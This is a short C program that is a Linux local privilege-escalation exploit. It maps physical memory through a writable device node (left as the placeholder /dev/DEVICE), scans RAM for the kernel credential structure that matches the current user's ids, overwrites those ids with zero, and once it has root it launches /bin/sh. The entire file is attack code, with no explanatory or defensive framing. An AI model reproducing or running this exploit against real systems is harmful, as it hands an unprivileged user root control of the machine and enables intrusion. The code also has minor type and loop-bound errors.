#include <sys/fcntl.h>
#include <sys/mman.h>
#include <stdio.h>

// https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L115

// cat /proc/iomem
#define DEVICE "/dev/DEVICE"
#define MAX 0xdffeffff // RAM HIGH
#define MIN 0x00100000 // RAM LOW

typedef struct {
    int uid;
    int gid;
    int suid;
    int sgid;
    int euid;
    int egid;
    int fsuid;
    int fsgid;
} cred_ids;

cred_ids read_ids(unsigned int* addr) {
    cred_ids ids = {
        .uid = addr[0],
        .gid = addr[1],
        .suid = addr[2],
        .sgid = addr[3],
        .euid = addr[4],
        .egid = addr[5],
        .fsuid = addr[6],
        .fsgid = addr[7]
    };
    return ids;
}

int check_struct(cred_ids ids, int uid) {
    return ids.uid == uid && ids.gid == uid && ids.suid == uid && ids.sgid == uid && ids.euid == uid && ids.egid == uid && ids.fsuid == uid && ids.fsgid == uid;
}

void set_ids(unsigned int* addr, int uid) {
    for (int i = 0; i < 8; i++) {
        addr[i] = uid;
    }
}

int main(int argc, const char* argv) {
    int fd = open(DEVICE, O_RDWR);
    unsigned long size = MAX - MIN;
    unsigned int* addr = mmap((void*)MIN, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
    unsigned int uid = getuid();

    for (int i = 0; i < size; i++) {
        cred_ids ids = read_ids(addr + i);
        if (check_struct(ids, uid)) {
            set_ids(addr + i, 0);
            if (getuid() == 0) {
                system("/bin/sh");
                break;
            }
        }
    }

    return 0;
}
